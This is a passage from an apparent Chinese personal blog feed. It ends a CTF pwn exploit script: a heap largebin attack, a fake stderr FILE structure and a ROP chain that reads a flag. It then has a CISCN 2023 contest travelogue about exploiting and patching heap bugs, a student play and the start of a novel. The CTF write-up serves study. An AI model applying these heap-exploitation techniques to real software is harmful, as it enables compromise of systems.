class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line">            r=p.recvuntil(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">flag = r+p.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">log.success(flag)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2023半决赛游记</title>
      <link href="/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/"/>
      <url>/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="6-10"><a href="#6-10" class="headerlink" title="6.10"></a>6.10</h1><p>飞往云南</p><p>东航的空乘小姐姐还给我送来一个生日蛋糕，泪目，还挺好吃</p><p>云大的赛场多少有点寒酸了，大门比我寝室门大不了多少</p><p>没网线转接器，去外面买。老板说不开发票90一个，开发票110</p><p>买了两个，这时西华的队伍也来买转接器。我们眼睁睁看着老板坐地起价，不开发票110，开发票130</p><p>晚上吃了红伞伞、白伞伞、黄伞伞，心满意足地等着小人教我打pwn</p><p>回去把unlink看完，小人还没出现，大抵是鸽了</p><h1 id="6-11"><a href="#6-11" class="headerlink" title="6.11"></a>6.11</h1><p>本来想的是Beethoven负责补补补，我负责杀杀杀，结果第一波题就给了我小小的震撼</p><p>一道是堆题，另一道也是堆题</p><p>我artist还没逆完，别人CNSS已经把洞补好了，急死我了</p><hr><h2 id="artist-patch"><a href="#artist-patch" class="headerlink" title="artist_patch"></a>artist_patch</h2><p>整道题的功能大概是，选项1分配一个80h的chunk，并读取不超过80h的输入；选项2将指定chunk内容输出并free掉，free之前可以更改chunk开头的10h字节；选项3是将某个chunk开始的第任意个字节置为NULL</p><p>整个程序中没有发现溢出，但是似乎可以利用3的功能实现对chunk header的改写，然后打一个unlink</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194620801.png" alt="image-20230612194620801"></p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194711287.png" alt="image-20230612194711287"></p><p>但是因为开了Full RELRO，无法进行got hijacking，俺横竖想了半天也找不到劫持控制流的办法，但是patch还是可以做到的，只需要让更改的byte不超过chunk范围就可以了</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195202307.png" alt="image-20230612195202307"></p><p>于是我将my_read中canary部分改写成rax与80h的比较跳转语句，成功patch</p><h2 id="over-patch"><a href="#over-patch" class="headerlink" title="over_patch"></a>over_patch</h2><p>本场唯一一道非堆题，怎么办怎么办我还是不会</p><p>逻辑很简单，有四个选项，前三个选项都是读入一个小于等于4的数，进行一通很猛的计算，然后将某个地址的内容修改</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195909839.png" alt="image-20230612195909839"></p><p>选项4是将程序开头输入的名称再次输出。实现方法是：程序开始时把puts的plt地址放入某个地址，然后再调用这个地址。很显然，这里可以更改这个地址的内容，轻松地system(“&#x2F;bin&#x2F;sh”)</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200128649.png" alt="image-20230612200128649"></p><p>所以patch也非常简单，只需要把调用地址改成直接调用函数就行了</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200535096.png" alt="image-20230612200535096"></p><p>没想到这个patch折磨了我几个小时</p><p>首先，我的patch流程非常的原始，因为linux本找不到合适的ida，win本搞忘装wsl，我都是在win本上用ida进行patch，再用u盘拷到linux本上验证。这样操作u盘和接口都挺累的，Beethoven和Sparkl的u盘就是这样被玩得识别不了（</p><p>然后我发现，不管我怎么改，最后运行的时候都会segment fault。我以为是我的问题，于是尝试了各种方法：直接call puts、直接call my_write、把puts的plt再覆写到原位置再call（这个操作很长，需要jump到en_frame段），甚至我还试过在每次更改后都调用一遍初始化函数、把初始化函数放进while循环这些离谱操作，结果都是悲伤的segment fault。</p><p>我怀着沉痛的心情决定用gdb跑一遍，看看问题在哪里。于是我一路走下去，走到选项四，看到一行熟悉的汇编：jmp 0x……</p><p>我超，这不是我几轮之前的版本吗！我以为是我操作失误没有拷贝上，于是重新应用了一遍patch，重新拷过来，结果依旧能看到熟悉的jmp</p><p>此前，我一直是个坚定的无神论者</p><p>我用ida又应用了一份patch，然后用ida打开，果不其然，还是有jmp</p><p>我的ida烂了！</p><p>（严格来说，U盘也是烂的，后面我发现有时改动U盘文件，拔插后竟然可以恢复如初）</p><p>我抢来Beethoven的电脑，改了两遍就好了，call my_write，没有segment fault</p><p>喜闻乐见的是，我们交上去之后，结果是这样的：</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612203259477.png" alt="image-20230612203259477"></p><p>乐，折磨了我两个多小时的洞，改半天连关键点都没改对</p><p>我盯着代码看了半天，横竖没看到别的洞。</p><p>直到比赛结束前二十分钟，我还是不相信，怀疑是打包的问题，于是又打了一遍。准备再次提交时，我看到提交要求：patch脚本应命名为update.sh，我一直写的是over.sh</p><p>哄堂大笑了</p><p>樂</p><h2 id="over-getflag"><a href="#over-getflag" class="headerlink" title="over_getflag"></a>over_getflag</h2><p>没做出来，解法是shino教的</p><p>我一直以为那几个修改是什么高深的算法，一度唆使密码学大师Beethoven进行破解。他发现v5并没有用上，然后我们止步于此。事实上，整个算法都是障眼法，真正有用的部分只有：将<code> *((_DWORD *)&amp;qword_4060 + v3 + 12)</code>的内容减去读入的<code>my_read</code>，因为v3可以为负，可以直接修改存储puts_plt处的内容</p><p>实际上我最大的问题是把<code>qword_4060 += v4</code>这句误以为是地址会加上v4，于是认为v4会影响最后修改的地址</p><p>所谓逆向不规范，打pwn两行泪</p><hr><p>走的时候听见一个指导老师在跟队员说：你之前的作业又没有认真做吧，你看这次出原题了吧</p><h1 id="6-12"><a href="#6-12" class="headerlink" title="6.12"></a>6.12</h1><p>计划：上午逛云大</p><p>现实：11：30被电话叫醒</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>不会堆，我好菜（你以为你菜只是因为不会堆吗）</p><p>为了打patch补了一些汇编知识，对于一个只会f5的pwn手已经很难得了</p><p>学点逆向吧</p><p>CNSS好强</p><p>什么时候才能有钱换电脑啊</p><p>云南美女真多</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> awd </tag>
            
            <tag> 摸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湍流</title>
      <link href="/%E6%B9%8D%E6%B5%81/"/>
      <url>/%E6%B9%8D%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<blockquote><p>大一学生抽象心理课作品</p></blockquote><h1 id="第一幕，外景：河水边"><a href="#第一幕，外景：河水边" class="headerlink" title="第一幕，外景：河水边"></a>第一幕，外景：河水边</h1><p>人物：程晓靛、程晓靛（卷）、程晓靛（摆）、河神、学神。</p><p>（程晓靛上）</p><p>程（独白）：程晓靛啊程晓靛，你追寻18年的目标，在高考完的夜晚竟然凭空消失了。你以为你会在新的校园找到新的方向，呵，这三个月只让你变得更加迷茫。</p><p>卷：各式各样的人，各式各样的湍流。</p><p>摆：你只是一片在他们之间晕头转向的落叶。</p><p>卷：忙碌却不知道所做为何。</p><p>摆（戏谑）：好像一条狗啊。</p><p>（程摆摆头，烦躁地走到河边的围栏处，靠了上去）</p><p>（河神身着西装，在他身后凭空出现）</p><p>河：别跳啊小伙子，有事都可以向领导反映。</p><p>程：谁要跳了？我在观察这只黑天鹅的形体美。</p><p>河：跟你开玩笑的，我是河神，当然知道你在想什么。</p><p>程：没见过河神穿西装的。</p><p>河：这不提升品牌形象嘛。</p><p>（说着走向河边，面朝大河，背身侧对着程晓靛）</p><p>河：我在这里工作了六十年，见过太多你这样的学生。（突然感慨）可能迷茫才是青春的常态，步伐坚定都是意料之外。</p><p>摆（窃窃私语）：他谁啊？</p><p>卷：卖保险的让进学校了？</p><p>河（清清嗓子装作没听见）：我们决定给这样的学生一个机会，一个让他们找到自己方向的机会。（转身严肃地看向程）如果你能按别人的人生轨迹生活，你最想成为谁？</p><p>程：啊（迟疑）成为别人？</p><p>河：别误会，你还是你，只是你的目标、生活轨迹会随之改变。</p><p>摆：听起来不错，省得在迷茫中浪费四年。</p><p>卷（思索）：咱学校今年不是有个保研清华的学长吗，圈里都叫他神仙。</p><p>（开始插入学神的片段，卷为旁白）</p><p>卷：据说他考试从来没有低过99分（内景，宿舍，学神在学习，有人递来一张100试卷，学神随手往废纸篓一扔，镜头切到废纸篓，里面全是满分试卷）</p><p>卷：竞赛大奖拿到手抽筋（内景，自习室，学神拿着一张奖状，手开始抽筋）</p><p>卷：于是顺理成章地成为了保研清华的最佳人选（学长在清华门前拍照，此处的清华门可以p上去，或者在大屏幕上投一个清华门的背景）</p><p>（幻想时间结束，回到原来的场景）</p><p>程（点点头）：我想成为他。</p><p>河（微笑）：那你闭上眼睛。</p><p>程闭眼，河掏出一粒红色药丸，粗鲁地塞进程晓靛嘴里，程试图挣扎。</p><p>画面一黑。</p><p>河的声音：但是，古尔丹，代价是什么呢？</p><h1 id="第二幕，内景：自习室"><a href="#第二幕，内景：自习室" class="headerlink" title="第二幕，内景：自习室"></a>第二幕，内景：自习室</h1><p>人物：程晓靛，卷，摆，奚彩（女朋友），室友老王</p><p>程晓靛趴在桌子上睡觉，突然惊醒</p><p>程：我是谁，我在哪，我在干什么？</p><p>卷：你是卷王，你在自习室，你在为中华之崛起而读书。</p><p>摆：差不多得了，这才六点过，你偏要跑来背什么单词，做给谁看呢。</p><p>程突然惊讶地发现眼前有一本翻开的单词书。</p><p>摆：让我看看带学霸背多少了……（抢过单词书）（郑重其事地饱含感情地大声朗读）A，Abandon，放弃。</p><p>卷（愤怒地）：哎呦你干嘛（抢过单词书给程），人的转变总是要点时间适应。像你这样急功近利，什么事也做不成。（转头看向程，温柔而坚定地）我们一起，为了梦想奋斗吧。</p><p>程点点头，眼中有希望的光。</p><h2 id="2-1-内景，自习室"><a href="#2-1-内景，自习室" class="headerlink" title="2-1 内景，自习室"></a>2-1 内景，自习室</h2><p>镜头正对学习中的程，倍速播放程学习的一天，光线由暗到明再到暗，桌子上堆积的书一堆慢慢减少，另一堆慢慢增多，他的身后人来人往。程一直埋头苦学。</p><p>晚上，奚小彩静静来到他身边，拍了拍他</p><p>程惊：奚小彩？</p><p>奚小彩微笑着示意和她一起出去。</p><p>程无奈地摇了摇头，指了指堆积的书籍。</p><p>奚小彩苦笑。</p><h2 id="2-2-外景，体育场边的道路上"><a href="#2-2-外景，体育场边的道路上" class="headerlink" title="2-2 外景，体育场边的道路上"></a>2-2 外景，体育场边的道路上</h2><p>程举着手机慢跑，镜头迎着程，保持程在画面中心。</p><p>旁边走来一个拿着篮球的兄弟招呼他打篮球，程摆摆手，举起手中的乐健示意</p><p>旁边走来一个拿着乒乓球拍的兄弟招呼他打乒乓球，程摆摆手，举起手中的乐健示意</p><p>旁边走来一个拿着羽毛球拍的兄弟招呼他打羽毛球，程摆摆手，举起手中的乐健示意</p><h2 id="2-3-外景，夜晚，长椅上"><a href="#2-3-外景，夜晚，长椅上" class="headerlink" title="2-3 外景，夜晚，长椅上"></a>2-3 外景，夜晚，长椅上</h2><p>程拿着课本满怀感情地大声朗读：where there is a will，there is a way</p><p>突然手机响了，奚彩发来一条微信：我不想耽误你   就这样吧。</p><p>程看向天空，黑暗中看不清他的脸。</p><h2 id="2-4-内景，宿舍里，清晨"><a href="#2-4-内景，宿舍里，清晨" class="headerlink" title="2-4 内景，宿舍里，清晨"></a>2-4 内景，宿舍里，清晨</h2><p>镜头落在日历上，圈出了保研结果公布的日期，正是今天。</p><p>程醒来，发现手机邮箱里收到了清华大学的offer。</p><p>他惊喜地欢呼，他跃下床：芜湖！兄弟们！我要上清华了！</p><p>可是没有人回应</p><p>镜头扫过寝室，两个室友都不在，剩下的一个戴着耳机在打游戏。</p><p>程拍拍室友的肩，室友摘下耳机回头，然后回头继续打游戏，程问：老王，他们两个人呢？这么早就不见了？</p><p>老王头也不回：你忘了？今天是老李生日，老张带着他女朋友一起去市里给他庆生了。</p><p>程：那你怎么没去？</p><p>老王：这不刚拿到菊花厂offer，待会下午要去那边对接一下工作，分身乏术啊。</p><p>程目瞪口呆。</p><h1 id="第三幕-外景-河边"><a href="#第三幕-外景-河边" class="headerlink" title="第三幕 外景 河边"></a>第三幕 外景 河边</h1><p>人物：程晓靛，卷，摆，河神</p><p>河神坐在一边，程晓靛在一边踱步</p><p>程：事情就是这样，经过四年的奋斗，我终于达到了自己的梦想。可是站在终点回望这四年的旅途，我好像错过了太多风景，失去了太多的旅伴。</p><p>河：人生就是这样嘛，得失参半，再寻常不过。</p><p>程（愤怒）：但这不是我想要的！这不该是我的大学生活！</p><p>河无奈地摇摇头，从口袋里摸出红蓝两粒药丸：我现在给你一次重新选择的机会，红色药丸能让你重新选择你要成为的人，蓝色药丸会将你过去的四年化为云烟，赤手空拳地重新开始。</p><p>摆：你看那个老王，我就没见他上过几回课，每天不是出去花天酒地就是在寝室打游戏，最后还不是顺利拿到了菊花厂的offer？我看就选他吧。</p><p>卷：我不相信有这样的好事…</p><p>话音未落，程上前已经抓走了红色药丸，一口吞下。</p><p>画面一黑。</p><h1 id="第四幕-内景-宿舍"><a href="#第四幕-内景-宿舍" class="headerlink" title="第四幕 内景 宿舍"></a>第四幕 内景 宿舍</h1><p>人物：程 卷 摆</p><p>程在宿舍打游戏，打出一个漂亮的五杀</p><p>摆（心满意足）：我说咱这几年，不受高数的折磨，脑细胞的存活率真是大幅提升了啊。</p><p>卷（不屑）：是啊，不去围猎猛犸象真是埋没人才了。</p><p>程：你别管，至少我这几年过的像神仙。</p><p>卷（阴阳怪气）：神仙马上就要脸朝下落地咯。</p><p>摆：别，咱的offer已经在路上了。</p><p>卷：你也不看今天几号了？您这offer是M87星云走申通快递寄来的吧</p><p>程看日历，惊了</p><p>摆：咋办</p><p>程：找那老头理论去！</p><h1 id="第五幕-外景-河边"><a href="#第五幕-外景-河边" class="headerlink" title="第五幕 外景 河边"></a>第五幕 外景 河边</h1><p>人物： 程 卷 摆 河</p><p>程到河边破口大骂：糟老头子！给我滚出来！我的offer呢！</p><p>河神在身后出现，邪魅一笑：你爹又不是菊花厂老板</p><p>程凝住。</p><p>随后感到愤怒，此处应有白金之星处刑曲响起，程转身面向河神，身后出现摆和卷。</p><p>摆，卷：欧拉！（一拳打倒河神）</p><p>程：朋友们，我明白了，（走近河神倒下的身体），没有人可以帮我决定我的生命，也没有人可以为我失败的选择负责（同时单膝蹲下，在河神身上摸索，找到蓝色药丸），我想过好我自己的人生（两根手指举起药丸，对着太阳的方向）</p><p>卷：握紧每一分钟的生命</p><p>摆：准备迎接每一个当下的美好</p><p>程：对自己的一切行为负责</p><p>三人：无怨无悔。</p><p>程吞下药丸，画面一黑。</p><h1 id="第六幕"><a href="#第六幕" class="headerlink" title="第六幕"></a>第六幕</h1><p>与画面同步的旁白：“那时候我突然意识到，每条溪流都有自己的轨迹，细小的不必强求气势磅礴，高亢的不必羡慕宛转轻盈。我本来就不必成为任何人，我只要做，当下最好的自己。</p><h2 id="6-1-程晓靛在自习室和同学热火朝天地讨论数学问题"><a href="#6-1-程晓靛在自习室和同学热火朝天地讨论数学问题" class="headerlink" title="6-1 程晓靛在自习室和同学热火朝天地讨论数学问题"></a>6-1 程晓靛在自习室和同学热火朝天地讨论数学问题</h2><h2 id="6-2-程晓靛和奚小彩在夜晚的灯光下漫步，走到之前（2-3）程晓靛分手的位置时，两人突然相视一笑"><a href="#6-2-程晓靛和奚小彩在夜晚的灯光下漫步，走到之前（2-3）程晓靛分手的位置时，两人突然相视一笑" class="headerlink" title="6-2 程晓靛和奚小彩在夜晚的灯光下漫步，走到之前（2-3）程晓靛分手的位置时，两人突然相视一笑"></a>6-2 程晓靛和奚小彩在夜晚的灯光下漫步，走到之前（2-3）程晓靛分手的位置时，两人突然相视一笑</h2><h2 id="6-3-程晓靛在足球场上奔跑，一个帅气的射门，球进了，奚小彩欢呼。"><a href="#6-3-程晓靛在足球场上奔跑，一个帅气的射门，球进了，奚小彩欢呼。" class="headerlink" title="6-3 程晓靛在足球场上奔跑，一个帅气的射门，球进了，奚小彩欢呼。"></a>6-3 程晓靛在足球场上奔跑，一个帅气的射门，球进了，奚小彩欢呼。</h2>]]></content>
      
      
      <categories>
          
          <category> literature </category>
          
      </categories>
      
      
        <tags>
            
            <tag> literature </tag>
            
            <tag> drama </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鱼人头套</title>
      <link href="/%E9%B1%BC%E4%BA%BA%E5%A4%B4%E5%A5%97/"/>
      <url>/%E9%B1%BC%E4%BA%BA%E5%A4%B4%E5%A5%97/</url>
      
        <content type="html"><![CDATA[<blockquote><p>高考完开始写，不知道这辈子能不能完结</p></blockquote><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>他最后一次回望这座渔村时，它正埋葬在夕阳和海盐中。 海崖的另一端，余晖把来人的面孔扫成明暗两界，明处的笑颜他已然见过无数次，而那深不可测的暗，使他联想到起清早偶遇的鱼人头套，和它空洞的眼睛。</p><p>夜的海潮褪去，似乎已经洗刷去村庄的一切污垢。在消毒剂般的潮湿空气中，他推开了房间门。桌上只留有一人份的稀饭，显然母亲和妹妹都已经离开。这倒免受起晚的数落，他庆幸地坐下，随后就回味起那个他久久不愿醒来的梦。那时他被柔软的鳞片包裹，海水清凉的触感托着他的身体缓缓下坠，一点一点，远离海面那晕摇曳着的微光。 以往，在其他孩子争相跃入水中潜泳时，他常是借口守衣服而在岸边观望的那个——他在水中浮不起来，而总是如铅块般往下掉。所以，如果你问他海底什么样子，他的回答往往就如所有见多识广的观光客一样，能在一切科普书、报纸、课本中找到影子，却唯独不属于他自己。 </p><p>两下轻柔的敲门声将他拉出海底。</p><p>“哥，在吗？”，他撂下筷子，大步走向门外那个悦耳的声音。在他用袖子擦干嘴角油污的同时，另一只手找到了椅子上斜挂着的青色书包。 门口的来客穿着一中的蓝白色校服，齐肩短发上落满了金色的光辉。她的眼角轻轻向上翘起，双眸沉静得像昨夜不眠的深海。 但深海几乎在门打开的瞬间就泛起了波澜，“哥！”，红伊面色泛红，显然刚跑了不少路。“我刚才把书包落家里了……欸，哥你怎么知道？”她欣喜地接过书包，“谢了！全天下最好的哥！” </p><p>他流露出愉快的神情，视线却一直停在红伊的头发上。而自从递出书包后，他攥着空气的双手就无处安放。“不用谢，”他觉得太简短，“应该的。” 妹妹嘴角的笑意令他更局促了，所幸她立刻转移了话题：“今晚的灯会，你准备得怎么样了？”</p><p>红伊口中的灯会，在百年前这片海滩上，与这个渔村一并孵化而出。那时的它，不过如一只初生的小鱼，却承载了太多关乎存亡的祈福含义；如今游历百年后，它鲸般厚重的身体倦怠地搁浅在海岸线上，但浪潮早已将它的内脏磨蚀殆尽，只给不解的后人留下一具巍峨的白骨。 单薄的小镇承受不起更多狂欢，因而这一年一度的盛会似乎就成了一个值得在日历上写下倒计时的节点，好像盼到这天来临，手中的、衬衫里的、被单上的盐渍，就全部变成了糖。</p><p>他和吴致知是村中为数不多的不参加灯会的人。后者曾在一个灯火之夜误打误撞闯入了寺庙后门，此后每逢灯会夜晚，他总把自己锁在屋子里，年复一年， “不食人间烟火”的笑传也不胫而走。前者虽是吴致知的学生，却没有这等高洁的情操。相反，他常常渴望成为一盏无人不赏的灯，在万众瞩目中恣意焕发光彩，但他现在害怕万众瞩目，因为他没有光。</p><p>“大概和往年一样吧。”他答道。和往年一样，意思是哪也不去，什么也不准备。红伊的嘴角浮出一丝苦涩的笑，显然对这个答复不太满意，在一番“和往年一样”无力的劝说后，她不得不就此告别——一中的九年级在灯会期间照常上半天课。 他出神地望着那个蓝色背影，直到她消失在远处一堵灰色的墙后。</p><p>关门，屋中寂然无声，碗里的稀饭凝起厚厚的膜，一只苍蝇停在了远处日历的红圈上。 这时，门外又传来急促的脚步声，他盘算着来客会立即敲门，但门外出乎意料地安静了片刻，随后才听到那人呼喊他的名字。 </p><p>他欣喜地奔向门口，来者果然是许落。在他并不算绚丽的前半截生命图卷中，充斥着死板的线条和大篇幅的留白。许落是仅次于红伊的泼墨丹青。阔别多日，他正要寒暄几句，眼前好友的状态却让他难以开口：凌乱地拧在一起的头发，看上去像困在油污中的海鸟羽毛；往日廉价但整洁的白衬衫，也揉得像包裹过腌鱼的报纸。许落仿佛刚结束与一头巨兽的鏖战，可他的眼神，那决绝的眼神，那能烧灭一切阻碍的眼神，似乎暗示着他才是那头巨兽。</p><p>“落子，你……怎么了？”但许落只是微笑着摇了摇头，捧出手中的红布包裹：“刚刚看到她走了，等她放学，你帮我把这个给她吧。”他双手接过，柔软的触感立即抵达了他的指尖。他低头看着包裹，也不拆开，也不说话。“这是我托村口那个北京贩子买的，听说是进口货，她穿上一定好看。”许落似笑非笑的神情有些谄媚，“我特地让他挑的青色。” 他迟钝地点点头，示意一定转交到手，看看许落的头发，又后知后觉地想起些什么：“进来坐坐吧，烧点热水把你那头发洗了。”许落摆摆手退去：“我还忙，先走一步，等到明天一切就好了。”</p><p>木门吱吱呀呀关上了。他看看许落刚才站过的地方，又看看手中的包裹，回味着他最后一句话的含义。 他来到餐桌前，简单用袖子擦了一下，随后放上红布包裹。他刚打算把缠线咬开，却迟疑了一下，还是从厨房拿来一把剔骨刀，摸索到那根串起所有线的结头。手起刀落，失去束缚的红布在那份神秘礼物的助推下鲜花般绽开。 鲜花的中心，赫然躺着一个绿得发亮的头套，它黄色的嘴唇凸起成一个热烈的吻，扁而长的鼻孔夸张地向上耸起，两鬓之后的部分被细致地勾勒成鱼鳍、鱼鳞的形状。几番失败的闪躲后，你的视线最终还是退无可退地被引向它漆黑的双眼，这两个深不可测的漩涡，空洞到了令人不安的程度。在这连光也无法逃脱的黑洞面前，一切妄想解读什么的徒劳尝试，都像是一个笑话。</p><h2 id="2"><a href="#2" class="headerlink" 